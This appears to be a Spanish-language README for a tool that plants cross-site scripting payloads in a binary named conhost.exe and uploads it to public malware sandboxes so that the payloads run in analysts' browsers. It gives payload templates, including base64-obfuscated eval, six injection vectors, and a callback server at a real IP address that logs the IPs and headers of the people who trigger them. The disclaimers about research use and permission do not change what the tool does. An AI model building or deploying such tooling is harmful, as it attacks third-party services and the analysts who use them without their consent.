# 🎯 XSS Audit Module

## Resumen Rápido

El módulo XSS Audit detecta vulnerabilidades de Cross-Site Scripting en sandboxes de análisis de malware inyectando payloads en múltiples vectores y monitoreando cuáles se ejecutan.

## 🚀 Quick Start

### 1. Activar en el Agente

```bash
cd artefacto
nano .env
```

Cambiar:
```env
XSS_AUDIT=true
CALLBACK_SERVER=http://54.37.226.179
```

Compilar:
```bash
go build -o conhost.exe
```

### 2. Desplegar en el Servidor

```bash
cd visualizer
python manage.py makemigrations xss_audit
python manage.py migrate
```

O usar el script automático:
```bash
chmod +x deploy/deploy_xss_audit.sh
./deploy/deploy_xss_audit.sh
```

### 3. Usar

1. Ejecutar `conhost.exe` (con XSS_AUDIT=true)
2. Subir a un sandbox (any.run, hybrid-analysis, etc.)
3. Monitorear dashboard: `http://54.37.226.179/xss-audit/dashboard/`
4. Ver qué payloads se triggerean

## 📊 Estructura del Proyecto

```
artefacto/
├── xss/
│   ├── payloads.go      # Definición de payloads XSS
│   └── injector.go      # Lógica de inyección
├── models/payload.go    # Añadido XSSPayloadMetadata
├── config/config.go     # Añadido XSSAudit y CallbackServer
└── main.go              # Integración del modo XSS

visualizer/
├── xss_audit/
│   ├── models.py        # XSSPayload, XSSHit, SandboxVulnerability
│   ├── views.py         # Dashboard y callback endpoint
│   ├── urls.py          # Rutas
│   ├── admin.py         # Admin de Django
│   └── templates/
│       └── xss_audit/
│           └── dashboard.html
├── collector/
│   └── views.py         # Modificado para guardar payloads XSS
└── visualizer/
    ├── settings.py      # Añadido 'xss_audit' a INSTALLED_APPS
    └── urls.py          # Añadido include('xss_audit.urls')
```

## 🎯 Vectores de Inyección

| Vector | Descripción | Ejemplo |
|--------|-------------|---------|
| **hostname** | Modifica el nombre del PC | `PC-<img src=x onerror=fetch(...)>` |
| **filename** | Crea archivos con nombres XSS | `malware<script>...</script>.txt` |
| **process** | Ejecuta procesos con nombres XSS | `cmd.exe /c echo <svg onload=...>` |
| **registry** | Crea claves de registro XSS | `HKCU\Software\XSSTest<img...>` |
| **window** | Crea ventanas con títulos XSS | `<script>fetch(...)</script>` |
| **cmdline** | Argumentos de línea de comandos | `/c echo <img src=x onerror=...>` |

## 📈 Tipos de Payloads

1. **IMG con onerror**: `<img src=x onerror="fetch(...)">`
2. **Script directo**: `<script>fetch(...)</script>`
3. **SVG con onload**: `<svg onload=fetch(...)>`
4. **Base64 ofuscado**: `<img src=x onerror="eval(atob('...'))">`

## 🔍 Endpoints

### Callback (Público, sin auth)
```
GET /xss-callback?id=<payload_id>&v=<vector>
```
Recibe los hits cuando un XSS se triggerea.

### Dashboard (Requiere auth)
```
GET /xss-audit/dashboard/
```
Muestra estadísticas y resultados.

### Lista de Payloads
```
GET /xss-audit/payloads/
```
Lista todos los payloads inyectados.

### Detalle de Hit
```
GET /xss-audit/hit/<hit_id>/
```
Detalles de un hit específico.

## 📊 Modelos de Datos

### XSSPayload
```python
- payload_id: UUID único
- execution: FK a AgentExecution
- payload_type: Tipo de payload
- vector: Dónde se inyectó
- status: 'injected' o 'triggered'
```

### XSSHit
```python
- payload: FK a XSSPayload
- triggered_at: Timestamp
- source_ip: IP del sandbox
- user_agent: User-Agent
- referer: Referer header
- request_headers: JSON con headers
```

### SandboxVulnerability
```python
- sandbox_name: Nombre identificado
- identified_by: Cómo se identificó
- vulnerable_vectors: Lista de vectores
- hit_count: Número de hits
```

## 🔧 Configuración Avanzada

### Añadir Nuevos Payloads

Editar `artefacto/xss/payloads.go`:

```go
// Payload personalizado
id11 := GeneratePayloadID()
payloads = append(payloads, XSSPayload{
    ID:          id11,
    Type:        "custom-payload",
    Vector:      "custom",
    CallbackURL: callbackServer,
    Content:     fmt.Sprintf(`<custom>...</custom>`, callbackServer, id11),
})
```

### Añadir Nuevos Vectores

Editar `artefacto/xss/injector.go`:

```go
case "custom":
    injectIntoCustomVector(payload)
```

Implementar la función:

```go
func injectIntoCustomVector(payload XSSPayload) {
    // Tu lógica aquí
}
```

## 📝 Logs y Debugging

### Ver logs del agente
```bash
./conhost.exe
# Buscar líneas con [XSS]
```

### Ver logs del servidor
```bash
# Gunicorn
sudo journalctl -u gunicorn -n 100 | grep XSS

# Nginx
sudo tail -f /var/log/nginx/artefacto-visualizer-access.log | grep xss-callback
```

### Probar callback manualmente
```bash
curl "http://54.37.226.179/xss-callback?id=test123&v=hostname"
# Debe retornar una imagen GIF 1x1
```

## 🎓 Casos de Uso

### 1. Investigación Académica
- Estudiar qué sandboxes son vulnerables
- Analizar patrones de sanitización
- Publicar papers sobre seguridad de sandboxes

### 2. Bug Bounty
- Reportar vulnerabilidades a vendors
- Obtener recompensas por hallazgos
- Mejorar la seguridad del ecosistema

### 3. Red Team
- Evaluar defensas de la organización
- Probar si los analistas están protegidos
- Mejorar procesos de análisis de malware

## ⚠️ Advertencias

1. **Solo para investigación de seguridad**
2. **Obtener permiso antes de probar**
3. **No exfiltrar datos sensibles**
4. **Disclosure responsable**
5. **Documentar todo**

## 📚 Recursos

- [Guía Completa](XSS_AUDIT_GUIDE.md)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## 🤝 Contribuir

1. Fork del repo
2. Crear branch: `git checkout -b feature/xss-mejora`
3. Commit: `git commit -am 'Añadir mejora'`
4. Push: `git push origin feature/xss-mejora`
5. Pull Request

## 📄 Licencia

Este módulo es para investigación de seguridad. Usar responsablemente.

---

**Desarrollado para mejorar la seguridad de los sandboxes de análisis de malware.**
